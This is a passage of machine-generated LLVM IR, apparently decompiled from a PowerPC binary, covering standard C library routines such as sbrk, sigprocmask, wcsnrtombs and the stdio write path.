  ret i32 %v0_1000741c

; uselistorder directives
  uselistorder label %dec_label_pc_1000740c, { 1, 0 }
  uselistorder label %dec_label_pc_100073e8, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000742c = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000742c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 2, 0, 1 }
  uselistorder i32 577, { 1, 2, 0, 3 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000744c = load i32, i32* @global_var_1001d8ac.426, align 4
  %v3_10007450 = icmp eq i32 %v3_1000744c, 0
  br i1 %v3_10007450, label %dec_label_pc_10007458, label %dec_label_pc_10007464

dec_label_pc_10007458:                            ; preds = %entry
  store i32 268465244, i32* @lr, align 4
  %v1_10007458 = call i32 @__GI_brk(i32 0)
  %v1_1000745c = icmp slt i32 %v1_10007458, 0
  br i1 %v1_1000745c, label %dec_label_pc_1000748c, label %dec_label_pc_10007458.dec_label_pc_10007464_crit_edge

dec_label_pc_10007458.dec_label_pc_10007464_crit_edge: ; preds = %dec_label_pc_10007458
  %v0_10007464.pre = load i32, i32* @r30, align 4
  %v3_10007468.pre = load i32, i32* @global_var_1001d8ac.426, align 4
  br label %dec_label_pc_10007464

dec_label_pc_10007464:                            ; preds = %dec_label_pc_10007458.dec_label_pc_10007464_crit_edge, %entry
  %v3_10007468 = phi i32 [ %v3_10007468.pre, %dec_label_pc_10007458.dec_label_pc_10007464_crit_edge ], [ %v3_1000744c, %entry ]
  %v1_1000747c = phi i32 [ %v0_10007464.pre, %dec_label_pc_10007458.dec_label_pc_10007464_crit_edge ], [ %arg1, %entry ]
  %v3_10007464 = icmp eq i32 %v1_1000747c, 0
  store i32 %v3_10007468, i32* @r31, align 4
  br i1 %v3_10007464, label %dec_label_pc_10007490, label %dec_label_pc_10007478

dec_label_pc_10007478:                            ; preds = %dec_label_pc_10007464
  %v2_1000747c = add i32 %v1_1000747c, %v3_10007468
  store i32 268465284, i32* @lr, align 4
  %v1_10007480 = call i32 @__GI_brk(i32 %v2_1000747c)
  %tmp6 = icmp sgt i32 %v1_10007480, -1
  br i1 %tmp6, label %dec_label_pc_10007478.dec_label_pc_10007490_crit_edge, label %dec_label_pc_1000748c

dec_label_pc_10007478.dec_label_pc_10007490_crit_edge: ; preds = %dec_label_pc_10007478
  %v0_10007494.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007490

dec_label_pc_1000748c:                            ; preds = %dec_label_pc_10007478, %dec_label_pc_10007458
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10007490

dec_label_pc_10007490:                            ; preds = %dec_label_pc_10007478.dec_label_pc_10007490_crit_edge, %dec_label_pc_10007464, %dec_label_pc_1000748c
  %v0_10007494 = phi i32 [ %v0_10007494.pre, %dec_label_pc_10007478.dec_label_pc_10007490_crit_edge ], [ %v3_10007468, %dec_label_pc_10007464 ], [ -1, %dec_label_pc_1000748c ]
  ret i32 %v0_10007494

; uselistorder directives
  uselistorder i32 %v3_10007468, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_10007490, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_100074b0 = icmp eq i32 %arg2, 0
  br i1 %v3_100074b0, label %dec_label_pc_100074e8, label %dec_label_pc_100074d0

dec_label_pc_100074d0:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_100074e8, label %dec_label_pc_100074d8

dec_label_pc_100074d8:                            ; preds = %dec_label_pc_100074d0
  %v0_100074d8 = call i32 @__errno_location()
  %v2_100074e0 = inttoptr i32 %v0_100074d8 to i32*
  store i32 22, i32* %v2_100074e0, align 4
  %v0_1000750c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007508

dec_label_pc_100074e8:                            ; preds = %dec_label_pc_100074d0, %entry
  %v0_100074ec = call i32 @__asm_mfcr()
  %v1_100074f0 = and i32 %v0_100074ec, 268435456
  %v3_100074f0 = icmp eq i32 %v1_100074f0, 0
  store i32 %v0_100074ec, i32* %r31.global-to-local, align 4
  br i1 %v3_100074f0, label %dec_label_pc_10007508, label %dec_label_pc_100074fc

dec_label_pc_100074fc:                            ; preds = %dec_label_pc_100074e8
  %v0_100074fc = call i32 @__errno_location()
  %v0_10007500 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007500 = inttoptr i32 %v0_100074fc to i32*
  store i32 %v0_10007500, i32* %v2_10007500, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007508

dec_label_pc_10007508:                            ; preds = %dec_label_pc_100074e8, %dec_label_pc_100074d8, %dec_label_pc_100074fc
  %v0_1000750c = phi i32 [ %v0_100074ec, %dec_label_pc_100074e8 ], [ %v0_1000750c.pre, %dec_label_pc_100074d8 ], [ -1, %dec_label_pc_100074fc ]
  ret i32 %v0_1000750c

; uselistorder directives
  uselistorder label %dec_label_pc_10007508, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007538 = call i32 @__asm_mfcr()
  %v1_1000753c = and i32 %v0_10007538, 268435456
  %v3_1000753c = icmp eq i32 %v1_1000753c, 0
  store i32 %v0_10007538, i32* %r31.global-to-local, align 4
  br i1 %v3_1000753c, label %dec_label_pc_10007554, label %dec_label_pc_10007548

dec_label_pc_10007548:                            ; preds = %entry
  %v0_10007548 = call i32 @__errno_location()
  %v0_1000754c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000754c = inttoptr i32 %v0_10007548 to i32*
  store i32 %v0_1000754c, i32* %v2_1000754c, align 4
  br label %dec_label_pc_10007554

dec_label_pc_10007554:                            ; preds = %entry, %dec_label_pc_10007548
  %v0_10007564 = phi i32 [ %v0_10007538, %entry ], [ -1, %dec_label_pc_10007548 ]
  ret i32 %v0_10007564

; uselistorder directives
  uselistorder label %dec_label_pc_10007554, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1001d890.428 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000757c = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_10007590 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10007590, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000757c, label %dec_label_pc_1000759c, label %dec_label_pc_100075a4

dec_label_pc_1000759c:                            ; preds = %entry
  %v2_1000759c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000759c, i32* @r3, align 4
  br label %dec_label_pc_100075a4

dec_label_pc_100075a4:                            ; preds = %entry, %dec_label_pc_1000759c
  %v0_100075a8 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000759c ]
  %v2_100075a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_100075a8, i32* %stack_var_-40, align 4
  store i32 %v2_100075a4, i32* %stack_var_-36, align 4
  store i32 268465588, i32* @lr, align 4
  %v0_100075b0 = call i32 @__GI_wcsnrtombs()
  %v3_100075b4 = icmp eq i32 %v0_100075b0, 0
  br i1 %v3_100075b4, label %dec_label_pc_100075bc, label %dec_label_pc_100075c0

dec_label_pc_100075bc:                            ; preds = %dec_label_pc_100075a4
  br label %dec_label_pc_100075c0

dec_label_pc_100075c0:                            ; preds = %dec_label_pc_100075a4, %dec_label_pc_100075bc
  %v0_100075cc = phi i32 [ %v0_100075b0, %dec_label_pc_100075a4 ], [ 1, %dec_label_pc_100075bc ]
  ret i32 %v0_100075cc

; uselistorder directives
  uselistorder label %dec_label_pc_100075c0, { 1, 0 }
  uselistorder label %dec_label_pc_100075a4, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_100075d0 = load i32, i32* @r6, align 4
  store i32 %v0_100075d0, i32* @r7, align 4
  %v0_100075d4 = load i32, i32* @r5, align 4
  store i32 %v0_100075d4, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100075dc = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_100075dc

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100075e4 = load i32, i32* @lr, align 4
  store i32 %v0_100075e4, i32* %r0.global-to-local, align 4
  %v0_100075e8 = load i32, i32* @r3, align 4
  %v3_100075e8 = icmp eq i32 %v0_100075e8, 0
  br i1 %v3_100075e8, label %dec_label_pc_1000760c, label %dec_label_pc_100075f4

dec_label_pc_100075f4:                            ; preds = %entry
  %v1_100075f4 = load i32, i32* @r4, align 4
  %v4_100075f4 = icmp eq i32 %v0_100075e8, %v1_100075f4
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_100075f4, label %dec_label_pc_10007600, label %dec_label_pc_10007638

dec_label_pc_10007600:                            ; preds = %dec_label_pc_100075f4
  %v2_10007604 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007604, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007638

dec_label_pc_1000760c:                            ; preds = %entry
  %v2_1000760411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000760411, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10007638

dec_label_pc_10007618:                            ; preds = %dec_label_pc_10007678.dec_label_pc_10007658_crit_edge, %dec_label_pc_10007658.preheader
  %v0_10007618 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10007624 = inttoptr i32 %v0_10007618 to i32*
  store i32 84, i32* %v2_10007624, align 4
  %v0_1000769c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007698

dec_label_pc_1000762c:                            ; preds = %dec_label_pc_10007668
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10007688.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007684

dec_label_pc_10007638:                            ; preds = %dec_label_pc_10007600, %dec_label_pc_100075f4, %dec_label_pc_1000760c
  %v2_100076687 = phi i32 [ %v2_10007604, %dec_label_pc_10007600 ], [ %v0_100075e8, %dec_label_pc_100075f4 ], [ %v2_1000760411, %dec_label_pc_1000760c ]
  %v0_10007638 = load i32, i32* @r5, align 4
  %v1_10007638 = load i32, i32* @r6, align 4
  %v3_10007638 = icmp ugt i32 %v0_10007638, %v1_10007638
  br i1 %v3_10007638, label %dec_label_pc_10007640, label %dec_label_pc_10007644

dec_label_pc_10007640:                            ; preds = %dec_label_pc_10007638
  store i32 %v1_10007638, i32* @r5, align 4
  br label %dec_label_pc_10007644

dec_label_pc_10007644:                            ; preds = %dec_label_pc_10007638, %dec_label_pc_10007640
  %v0_10007650 = phi i32 [ %v0_10007638, %dec_label_pc_10007638 ], [ %v1_10007638, %dec_label_pc_10007640 ]
  %v1_10007644 = add i32 %v0_10007650, 1
  store i32 %v1_10007644, i32* %r0.global-to-local, align 4
  %v0_10007648 = load i32, i32* @r4, align 4
  %v1_10007648 = inttoptr i32 %v0_10007648 to i32*
  %v2_10007648 = load i32, i32* %v1_10007648, align 4
  store i32 %v2_10007648, i32* %r11.global-to-local, align 4
  store i32 %v0_10007650, i32* %r9.global-to-local, align 4
  store i32 %v0_10007650, i32* %ctr.global-to-local, align 4
  %v2_100076803 = icmp eq i32 %v0_10007650, 0
  br i1 %v2_100076803, label %dec_label_pc_10007684, label %dec_label_pc_10007658.preheader

dec_label_pc_10007658.preheader:                  ; preds = %dec_label_pc_10007644
  %v1_1000765816 = inttoptr i32 %v2_10007648 to i32*
  %v2_1000765817 = load i32, i32* %v1_1000765816, align 4
  store i32 %v2_1000765817, i32* %r0.global-to-local, align 4
  %v1_1000765c18 = add i32 %v2_10007648, 4
  store i32 %v1_1000765c18, i32* %r11.global-to-local, align 4
  %v2_1000766020 = icmp ugt i32 %v2_1000765817, 127
  br i1 %v2_1000766020, label %dec_label_pc_10007618, label %dec_label_pc_10007668.lr.ph

dec_label_pc_10007668.lr.ph:                      ; preds = %dec_label_pc_10007658.preheader
  %extract.t = trunc i32 %v2_1000765817 to i8
  br label %dec_label_pc_10007668

dec_label_pc_10007668:                            ; preds = %dec_label_pc_10007668.lr.ph, %dec_label_pc_10007678.dec_label_pc_10007658_crit_edge
  %v2_1000765823.off0 = phi i8 [ %extract.t, %dec_label_pc_10007668.lr.ph ], [ %extract.t24, %dec_label_pc_10007678.dec_label_pc_10007658_crit_edge ]
  %v2_1000766822 = phi i32 [ %v2_100076687, %dec_label_pc_10007668.lr.ph ], [ %v2_10007678, %dec_label_pc_10007678.dec_label_pc_10007658_crit_edge ]
  %v3_10007668 = inttoptr i32 %v2_1000766822 to i8*
  store i8 %v2_1000765823.off0, i8* %v3_10007668, align 1
  %v0_1000766c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000766c = urem i32 %v0_1000766c, 256
  store i32 %v1_1000766c, i32* %r0.global-to-local, align 4
  %v3_10007670 = icmp eq i32 %v1_1000766c, 0
  br i1 %v3_10007670, label %dec_label_pc_1000762c, label %dec_label_pc_10007678

dec_label_pc_10007678:                            ; preds = %dec_label_pc_10007668
  %v0_10007678 = load i32, i32* @r3, align 4
  %v1_10007678 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007678 = add i32 %v1_10007678, %v0_10007678
  store i32 %v2_10007678, i32* @r3, align 4
  %v0_1000767c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000767c = add i32 %v0_1000767c, -1
  store i32 %v1_1000767c, i32* %r9.global-to-local, align 4
  %v0_10007680 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007680 = add i32 %v0_10007680, -1
  store i32 %v1_10007680, i32* %ctr.global-to-local, align 4
  %v2_10007680 = icmp eq i32 %v1_10007680, 0
  br i1 %v2_10007680, label %dec_label_pc_10007684, label %dec_label_pc_10007678.dec_label_pc_10007658_crit_edge

dec_label_pc_10007678.dec_label_pc_10007658_crit_edge: ; preds = %dec_label_pc_10007678
  %v0_10007658.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10007658 = inttoptr i32 %v0_10007658.pre to i32*
  %v2_10007658 = load i32, i32* %v1_10007658, align 4
  store i32 %v2_10007658, i32* %r0.global-to-local, align 4
  %v1_1000765c = add i32 %v0_10007658.pre, 4
  store i32 %v1_1000765c, i32* %r11.global-to-local, align 4
  %v2_10007660 = icmp ugt i32 %v2_10007658, 127
  %extract.t24 = trunc i32 %v2_10007658 to i8
  br i1 %v2_10007660, label %dec_label_pc_10007618, label %dec_label_pc_10007668

dec_label_pc_10007684:                            ; preds = %dec_label_pc_10007678, %dec_label_pc_10007644, %dec_label_pc_1000762c
  %v0_10007688 = phi i32 [ %v0_10007688.pre, %dec_label_pc_1000762c ], [ %v2_100076687, %dec_label_pc_10007644 ], [ %v2_10007678, %dec_label_pc_10007678 ]
  %v2_10007684 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007684, i32* %r0.global-to-local, align 4
  %v4_10007688 = icmp eq i32 %v0_10007688, %v2_10007684
  br i1 %v4_10007688, label %dec_label_pc_10007694, label %dec_label_pc_10007690

dec_label_pc_10007690:                            ; preds = %dec_label_pc_10007684
  %v0_10007690 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007690 = load i32, i32* @r4, align 4
  %v2_10007690 = inttoptr i32 %v1_10007690 to i32*
  store i32 %v0_10007690, i32* %v2_10007690, align 4
  br label %dec_label_pc_10007694

dec_label_pc_10007694:                            ; preds = %dec_label_pc_10007684, %dec_label_pc_10007690
  %v0_10007694 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007694 = load i32, i32* @r5, align 4
  %v2_10007694 = sub i32 %v1_10007694, %v0_10007694
  store i32 %v2_10007694, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007698

dec_label_pc_10007698:                            ; preds = %dec_label_pc_10007618, %dec_label_pc_10007694
  %v0_1000769c = phi i32 [ %v0_1000769c.pre, %dec_label_pc_10007618 ], [ %v2_10007694, %dec_label_pc_10007694 ]
  store i32 %v0_100075e4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000769c

; uselistorder directives
  uselistorder i32 %v1_10007680, { 1, 0 }
  uselistorder i32 %v2_10007678, { 0, 2, 1 }
  uselistorder i32 %v1_1000766c, { 1, 0 }
  uselistorder i32 %v0_10007650, { 2, 3, 0, 1 }
  uselistorder i32 %v2_100076687, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007698, { 1, 0 }
  uselistorder label %dec_label_pc_10007694, { 1, 0 }
  uselistorder label %dec_label_pc_10007668, { 1, 0 }
  uselistorder label %dec_label_pc_10007644, { 1, 0 }
  uselistorder label %dec_label_pc_10007638, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100076b0 = load i32, i32* @lr, align 4
  store i32 %v0_100076b0, i32* %r0.global-to-local, align 4
  %v0_100076bc = load i32, i32* @r5, align 4
  store i32 %v0_100076bc, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_100076bc, i32* @r31, align 4
  %v3_100076cc3 = icmp eq i32 %v0_100076bc, 0
  br i1 %v3_100076cc3, label %dec_label_pc_10007774, label %dec_label_pc_100076d8

dec_label_pc_100076d8:                            ; preds = %entry, %dec_label_pc_100076fc
  %v0_100076ec = phi i32 [ %v2_100076fc, %dec_label_pc_100076fc ], [ %arg2, %entry ]
  %v0_100076d8 = phi i32 [ %v2_10007700, %dec_label_pc_100076fc ], [ %v0_100076bc, %entry ]
  %v1_100076dc.in = phi i32 [ %v2_10007700, %dec_label_pc_100076fc ], [ %v0_100076bc, %entry ]
  %v1_100076dc = icmp sgt i32 %v1_100076dc.in, 0
  store i32 %v0_100076d8, i32* @r27, align 4
  br i1 %v1_100076dc, label %dec_label_pc_100076e8, label %dec_label_pc_100076e0

dec_label_pc_100076e0:                            ; preds = %dec_label_pc_100076d8
  br label %dec_label_pc_100076e8

dec_label_pc_100076e8:                            ; preds = %dec_label_pc_100076d8, %dec_label_pc_100076e0
  %v0_100076e8 = load i32, i32* @r30, align 4
  %v1_100076e8 = add i32 %v0_100076e8, 4
  %v2_100076e8 = inttoptr i32 %v1_100076e8 to i32*
  %v3_100076e8 = load i32, i32* %v2_100076e8, align 4
  store i32 268465908, i32* @lr, align 4
  %v3_100076f0 = call i32 @__libc_write(i32 %v3_100076e8, i32 %v0_100076ec)
  %v1_100076f4 = icmp slt i32 %v3_100076f0, 0
  br i1 %v1_100076f4, label %dec_label_pc_10007708, label %dec_label_pc_100076fc

dec_label_pc_100076fc:                            ; preds = %dec_label_pc_100076e8
  %v0_100076fc = load i32, i32* @r29, align 4
  %v2_100076fc = add i32 %v0_100076fc, %v3_100076f0
  store i32 %v2_100076fc, i32* @r29, align 4
  %v1_10007700 = load i32, i32* @r31, align 4
  %v2_10007700 = sub i32 %v1_10007700, %v3_100076f0
  store i32 %v2_10007700, i32* @r31, align 4
  %v3_100076cc = icmp eq i32 %v2_10007700, 0
  br i1 %v3_100076cc, label %dec_label_pc_100076cc.dec_label_pc_10007774.loopexit_crit_edge, label %dec_label_pc_100076d8

dec_label_pc_10007708:                            ; preds = %dec_label_pc_100076e8
  %v0_10007708 = load i32, i32* @r30, align 4
  %v1_10007708 = add i32 %v0_10007708, 8
  %v2_10007708 = inttoptr i32 %v1_10007708 to i32*
  %v3_10007708 = load i32, i32* %v2_10007708, align 4
  store i32 %v3_10007708, i32* %r11.global-to-local, align 4
  %v1_1000770c = add i32 %v0_10007708, 12
  %v2_1000770c = inttoptr i32 %v1_1000770c to i32*
  %v3_1000770c = load i32, i32* %v2_1000770c, align 4
  store i32 %v3_1000770c, i32* %r0.global-to-local, align 4
  %v1_10007710 = inttoptr i32 %v0_10007708 to i16*
  %v2_10007710 = load i16, i16* %v1_10007710, align 2
  %v2_10007714 = sub i32 %v3_1000770c, %v3_10007708
  store i32 %v2_10007714, i32* %r0.global-to-local, align 4
  %v5_10007714 = icmp eq i32 %v2_10007714, 0
  %v1_10007718 = or i16 %v2_10007710, 8
  store i16 %v1_10007718, i16* %v1_10007710, align 2
  br i1 %v5_10007714, label %dec_label_pc_10007708.dec_label_pc_10007770_crit_edge, label %dec_label_pc_10007724

dec_label_pc_10007708.dec_label_pc_10007770_crit_edge: ; preds = %dec_label_pc_10007708
  %v0_10007770.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007770

dec_label_pc_10007724:                            ; preds = %dec_label_pc_10007708
  %v0_10007724 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007724 = load i32, i32* @r31, align 4
  %v3_10007724 = icmp ugt i32 %v0_10007724, %v1_10007724
  br i1 %v3_10007724, label %dec_label_pc_10007724.dec_label_pc_10007730_crit_edge, label %dec_label_pc_1000772c

dec_label_pc_10007724.dec_label_pc_10007730_crit_edge: ; preds = %dec_label_pc_10007724
  %v0_10007730.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10007730

dec_label_pc_1000772c:                            ; preds = %dec_label_pc_10007724
  store i32 %v0_10007724, i32* @r27, align 4
  br label %dec_label_pc_10007730

dec_label_pc_10007730:                            ; preds = %dec_label_pc_10007724.dec_label_pc_10007730_crit_edge, %dec_label_pc_1000772c
  %v0_10007730 = phi i32 [ %v0_10007730.pre, %dec_label_pc_10007724.dec_label_pc_10007730_crit_edge ], [ %v0_10007724, %dec_label_pc_1000772c ]
  store i32 %v0_10007730, i32* %ctr.global-to-local, align 4
  %v2_1000773c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007734

dec_label_pc_10007734:                            ; preds = %dec_label_pc_10007758, %dec_label_pc_10007730
  %v2_1000773c = phi i32 [ %v1_10007758, %dec_label_pc_10007758 ], [ %v2_1000773c.pre, %dec_label_pc_10007730 ]
  %v0_10007734 = load i32, i32* @r29, align 4
  %v1_10007734 = inttoptr i32 %v0_10007734 to i8*
  %v2_10007734 = load i8, i8* %v1_10007734, align 1
  %v3_10007734 = zext i8 %v2_10007734 to i32
  store i32 %v3_10007734, i32* %r0.global-to-local, align 4
  %v1_10007738 = add i32 %v0_10007734, 1
  store i32 %v1_10007738, i32* @r29, align 4
  %v3_1000773c = inttoptr i32 %v2_1000773c to i8*
  store i8 %v2_10007734, i8* %v3_1000773c, align 1
  %v0_10007740 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007740 = urem i32 %v0_10007740, 256
  store i32 %v1_10007740, i32* %r0.global-to-local, align 4
  %v3_10007744 = icmp eq i32 %v1_10007740, 10
  br i1 %v3_10007744, label %dec_label_pc_1000774c, label %dec_label_pc_10007758

dec_label_pc_1000774c:                            ; preds = %dec_label_pc_10007734
  %v0_1000774c = load i32, i32* @r30, align 4
  %v1_1000774c = inttoptr i32 %v0_1000774c to i16*
  %v2_1000774c = load i16, i16* %v1_1000774c, align 2
  %v3_1000774c = zext i16 %v2_1000774c to i32
  store i32 %v3_1000774c, i32* %r0.global-to-local, align 4
  %v1_10007750 = and i32 %v3_1000774c, 256
  %v3_10007750 = icmp eq i32 %v1_10007750, 0
  br i1 %v3_10007750, label %dec_label_pc_10007758, label %dec_label_pc_1000774c.dec_label_pc_10007760_crit_edge

dec_label_pc_1000774c.dec_label_pc_10007760_crit_edge: ; preds = %dec_label_pc_1000774c
  %v0_10007764.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007760

dec_label_pc_10007758:                            ; preds = %dec_label_pc_1000774c, %dec_label_pc_10007734
  %v0_10007758 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007758 = add i32 %v0_10007758, 1
  store i32 %v1_10007758, i32* %r11.global-to-local, align 4
  %v0_1000775c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000775c = add i32 %v0_1000775c, -1
  store i32 %v1_1000775c, i32* %ctr.global-to-local, align 4
  %v2_1000775c = icmp eq i32 %v1_1000775c, 0
  br i1 %v2_1000775c, label %dec_label_pc_10007758.dec_label_pc_10007760_crit_edge, label %dec_label_pc_10007734

dec_label_pc_10007758.dec_label_pc_10007760_crit_edge: ; preds = %dec_label_pc_10007758
  %v0_10007760.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_1000774c.dec_label_pc_10007760_crit_edge, %dec_label_pc_10007758.dec_label_pc_10007760_crit_edge
  %v0_10007764 = phi i32 [ %v1_10007758, %dec_label_pc_10007758.dec_label_pc_10007760_crit_edge ], [ %v0_10007764.pre, %dec_label_pc_1000774c.dec_label_pc_10007760_crit_edge ]
  %v0_10007760 = phi i32 [ %v0_10007760.pre, %dec_label_pc_10007758.dec_label_pc_10007760_crit_edge ], [ %v0_1000774c, %dec_label_pc_1000774c.dec_label_pc_10007760_crit_edge ]
  %v1_10007760 = add i32 %v0_10007760, 8
  %v2_10007760 = inttoptr i32 %v1_10007760 to i32*
  %v3_10007760 = load i32, i32* %v2_10007760, align 4
  store i32 %v3_10007760, i32* %r0.global-to-local, align 4
  %v2_10007764 = add i32 %v0_10007760, 16
  %v3_10007764 = inttoptr i32 %v2_10007764 to i32*
  store i32 %v0_10007764, i32* %v3_10007764, align 4
  %v0_10007768 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007768 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007768 = sub i32 %v1_10007768, %v0_10007768
  store i32 %v2_10007768, i32* %r0.global-to-local, align 4
  %v1_1000776c = load i32, i32* @r31, align 4
  %v2_1000776c = sub i32 %v1_1000776c, %v2_10007768
  store i32 %v2_1000776c, i32* @r31, align 4
  br label %dec_label_pc_10007770

dec_label_pc_10007770:                            ; preds = %dec_label_pc_10007708.dec_label_pc_10007770_crit_edge, %dec_label_pc_10007760
  %v0_10007770 = phi i32 [ %v0_10007770.pre, %dec_label_pc_10007708.dec_label_pc_10007770_crit_edge ], [ %v2_1000776c, %dec_label_pc_10007760 ]
  %v1_10007770 = load i32, i32* @r28, align 4
  %v2_10007770 = sub i32 %v1_10007770, %v0_10007770
  store i32 %v2_10007770, i32* @r28, align 4
  br label %dec_label_pc_10007774

dec_label_pc_100076cc.dec_label_pc_10007774.loopexit_crit_edge: ; preds = %dec_label_pc_100076fc
  %v0_10007778.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10007774

dec_label_pc_10007774:                            ; preds = %entry, %dec_label_pc_100076cc.dec_label_pc_10007774.loopexit_crit_edge, %dec_label_pc_10007770
  %v0_10007778 = phi i32 [ %v2_10007770, %dec_label_pc_10007770 ], [ %v0_10007778.pre.pre, %dec_label_pc_100076cc.dec_label_pc_10007774.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_100076b0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10007778

; uselistorder directives
  uselistorder i32 %v0_10007760, { 1, 0 }
  uselistorder i32 %v1_1000775c, { 1, 0 }
  uselistorder i32 %v1_10007758, { 0, 2, 1 }
  uselistorder i32 %v1_10007740, { 1, 0 }
  uselistorder i32 %v2_10007700, { 3, 2, 1, 0 }
  uselistorder i32 %v2_100076fc, { 1, 0 }
  uselistorder i32 %v3_100076f0, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder label %dec_label_pc_10007774, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007770, { 1, 0 }
  uselistorder label %dec_label_pc_10007760, { 1, 0 }
  uselistorder label %dec_label_pc_10007730, { 1, 0 }
  uselistorder label %dec_label_pc_100076e8, { 1, 0 }
  uselistorder label %dec_label_pc_100076d8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10007790 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
